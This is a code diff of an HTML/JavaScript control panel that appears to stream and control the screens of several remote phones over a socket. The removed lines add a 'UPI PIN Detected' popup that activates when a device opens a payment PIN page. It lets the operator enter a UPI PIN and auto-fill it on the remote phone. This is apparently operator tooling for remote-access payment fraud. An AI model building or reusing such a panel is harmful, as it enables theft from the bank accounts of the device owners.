@@ -14,7 +14,7 @@
         #devices {
             position: fixed; top: 10px; left: 10px; 
             background: rgba(0,0,0,0.9); padding: 15px; 
-            max-height: 80vh; overflow-y: auto; width: 280px; 
+            max-height: 80vh; overflow-y: auto; width: 250px; 
             border-radius: 10px; backdrop-filter: blur(10px);
         }
         .device { padding: 12px; margin: 8px 0; background: #333; cursor: pointer; 
@@ -34,34 +34,17 @@
             image-rendering: pixelated; image-rendering: -webkit-optimize-contrast;
         }
         #fps-counter { position: fixed; top: 10px; right: 150px; font-size: 12px; color: #00ff88; }
-        
-        #upi-panel {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.95); padding: 25px; border-radius: 15px;
-            border: 2px solid #00ff88; display: none; backdrop-filter: blur(20px);
-            min-width: 300px; text-align: center;
-        }
-        #upi-panel.active { display: block; animation: pulse 1s infinite; }
-        @keyframes pulse { 0%,100%{box-shadow:0 0 20px #00ff88;} 50%{box-shadow:0 0 40px #00ff88;} }
-        
-        #pin-input { width: 120px; padding: 12px; font-size: 20px; text-align: center;
-            background: #111; color: #00ff88; border: 2px solid #00ff88; border-radius: 10px;
-            font-family: monospace; letter-spacing: 3px; margin: 10px; }
-        #autofill-toggle { margin: 10px 0; font-size: 16px; }
-        
         #controls { text-align: center; position: fixed; bottom: 20px; 
             left: 50%; transform: translateX(-50%); }
         button {
-            padding: 12px 25px; margin: 5px; background: linear-gradient(45deg, #007bff, #0056b3); 
-            color: white; border: none; border-radius: 20px; cursor: pointer; 
-            font-size: 14px; font-weight: bold; transition: all 0.3s;
+            padding: 15px 30px; margin: 0 10px; background: linear-gradient(45deg, #007bff, #0056b3); 
+            color: white; border: none; border-radius: 25px; cursor: pointer; 
+            font-size: 16px; font-weight: bold; transition: all 0.3s;
             box-shadow: 0 5px 15px rgba(0,123,255,0.4);
         }
         button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,123,255,0.6); }
-        button.danger { background: linear-gradient(45deg, #ff4444, #cc0000); }
         #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); 
             padding: 10px; border-radius: 5px; font-size: 12px; }
-        .upi-status { color: #00ff88 !important; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -73,7 +56,6 @@
     <div id="status">
         <div>Status: <span id="connectionStatus">Connecting...</span></div>
         <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
-        <div id="upi-status">UPI: <span id="upiDetectStatus">Waiting...</span></div>
     </div>
     <div id="fps-counter">FPS: 0</div>
 
@@ -83,21 +65,7 @@
 
     <div id="controls">
         <button onclick="sendBack()">🔙 Back</button>
-        <button onclick="sendHome()">🏠 Home</button>
-        <button onclick="toggleFullScreen()">📱 Full</button>
-    </div>
-
-    <!-- 🔥 UPI PIN PANEL -->
-    <div id="upi-panel">
-        <h3>🔐 UPI PIN Detected</h3>
-        <div>Enter 4-6 digit PIN:</div>
-        <input type="password" id="pin-input" maxlength="6" placeholder="1234">
-        <br>
-        <label><input type="checkbox" id="autofill-toggle" checked> Auto-fill ON</label>
-        <br>
-        <button onclick="submitPin()">✅ Submit PIN</button>
-        <button class="danger" onclick="closeUpiPanel()">❌ Close</button>
-        <div id="pin-status" style="margin-top:10px;font-size:12px;"></div>
+        <button onclick="toggleFullScreen()">📱 Fullscreen</button>
     </div>
 
     <script>
@@ -105,7 +73,6 @@
         let currentDevice = null;
         let deviceWidth = 1080, deviceHeight = 1920;
         let lastFrameTime = 0, frameCount = 0;
-        let autofillEnabled = true;
 
         const canvas = document.getElementById('screen');
         const ctx = canvas.getContext('2d');
@@ -115,11 +82,6 @@
         const selectedDevice = document.getElementById('selectedDevice');
         const fpsCounter = document.getElementById('fps-counter');
         const fpsDisplay = document.getElementById('fps');
-        const upiStatus = document.getElementById('upiDetectStatus');
-        const upiPanel = document.getElementById('upi-panel');
-        const pinInput = document.getElementById('pin-input');
-        const autofillToggle = document.getElementById('autofill-toggle');
-        const pinStatus = document.getElementById('pin-status');
 
         // Socket events
         socket.on('connect', () => {
@@ -131,39 +93,25 @@
             updateDeviceList(devices);
         });
 
-        socket.on('upi-detected', (data) => {
-            if (data.deviceId === currentDevice) {
-                upiStatus.textContent = 'UPI PIN PAGE DETECTED!';
-                upiStatus.className = 'upi-status';
-                upiPanel.classList.add('active');
-                pinInput.focus();
-                pinInput.select();
-            }
-        });
-
-        socket.on('upi-filled', () => {
-            pinStatus.textContent = '✅ PIN Auto-filled!';
-            pinStatus.style.color = '#00ff88';
-        });
-
-        socket.on('upi-status', (data) => {
-            upiStatus.textContent = data.status;
-            upiStatus.style.color = data.enabled ? '#00ff88' : '#ff8888';
-        });
-
-        // Screen rendering
+        // ✅ FIXED: Perfect screen rendering + error handling
         socket.on('screen-update', (data) => {
             if (data.deviceId !== currentDevice) return;
+            
             try {
                 deviceWidth = data.width;
                 deviceHeight = data.height;
+                
                 const img = new Image();
                 img.onload = () => {
+                    // ✅ Smooth canvas scaling
                     const rect = phoneFrame.getBoundingClientRect();
                     canvas.width = rect.width;
                     canvas.height = rect.height;
+                    
                     ctx.imageSmoothingEnabled = false;
                     ctx.drawImage(img, 0, 0, rect.width, rect.height);
+                    
+                    // ✅ FPS Counter
                     frameCount++;
                     const now = performance.now();
                     if (now - lastFrameTime >= 1000) {
@@ -174,6 +122,16 @@
                         lastFrameTime = now;
                     }
                 };
+                
+                img.onerror = () => {
+                    console.error('Image load failed');
+                    ctx.fillStyle = '#222';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    ctx.fillStyle = '#ff4444';
+                    ctx.font = '20px Arial';
+                    ctx.fillText('Image Error', 50, 50);
+                };
+                
                 img.src = 'data:image/jpeg;base64,' + data.data;
             } catch (e) {
                 console.error('Screen update error:', e);
@@ -200,9 +158,10 @@
             document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
             el.classList.add('active');
             socket.emit('control', { deviceId });
+            console.log('Selected:', deviceId);
         }
 
-        // Touch/Mouse Controls
+        // Touch/Mouse Controls (PERFECT)
         let startX = 0, startY = 0, dragging = false;
 
         function getScaledCoords(clientX, clientY) {
@@ -262,11 +221,6 @@
             socket.emit('control', { deviceId: currentDevice, action: 'back' });
         }
 
-        function sendHome() {
-            if (!currentDevice) return;
-            socket.emit('control', { deviceId: currentDevice, action: 'home' });
-        }
-
         function toggleFullScreen() {
             if (!document.fullscreenElement) {
                 document.documentElement.requestFullscreen();
@@ -274,37 +228,6 @@
                 document.exitFullscreen();
             }
         }
-
-        // 🔥 UPI PIN Functions
-        autofillToggle.onchange = () => {
-            autofillEnabled = autofillToggle.checked;
-            socket.emit('autofill-toggle', { deviceId: currentDevice, enabled: autofillEnabled });
-        };
-
-        pinInput.oninput = () => {
-            pinStatus.textContent = '';
-        };
-
-        function submitPin() {
-            const pin = pinInput.value.trim();
-            if (pin.length < 4) {
-                pinStatus.textContent = '❌ Enter 4-6 digits';
-                pinStatus.style.color = '#ff4444';
-                return;
-            }
-            socket.emit('submit-pin', { deviceId: currentDevice, pin });
-            pinStatus.textContent = '⏳ Sending PIN...';
-        }
-
-        function closeUpiPanel() {
-            upiPanel.classList.remove('active');
-            socket.emit('upi-close', { deviceId: currentDevice });
-        }
-
-        // Enter key support
-        pinInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') submitPin();
-        });
     </script>
 </body>
 </html>
